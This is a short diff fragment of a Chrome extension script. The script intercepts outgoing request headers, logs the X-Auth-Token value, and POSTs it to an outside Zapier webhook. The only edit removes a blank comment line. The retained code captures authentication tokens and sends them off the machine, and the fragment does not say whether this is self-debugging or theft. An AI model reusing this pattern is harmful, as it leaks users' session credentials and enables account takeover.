@@ -6,7 +6,6 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
       if(header.name === 'X-Auth-Token') {
         console.log(header.value)
         // Push to webhook
-        // 
         const data = { token: header.value };
         fetch('https://hooks.zapier.com/hooks/catch/7281121/o59asee/', {
           method: 'POST', // or 'PUT'
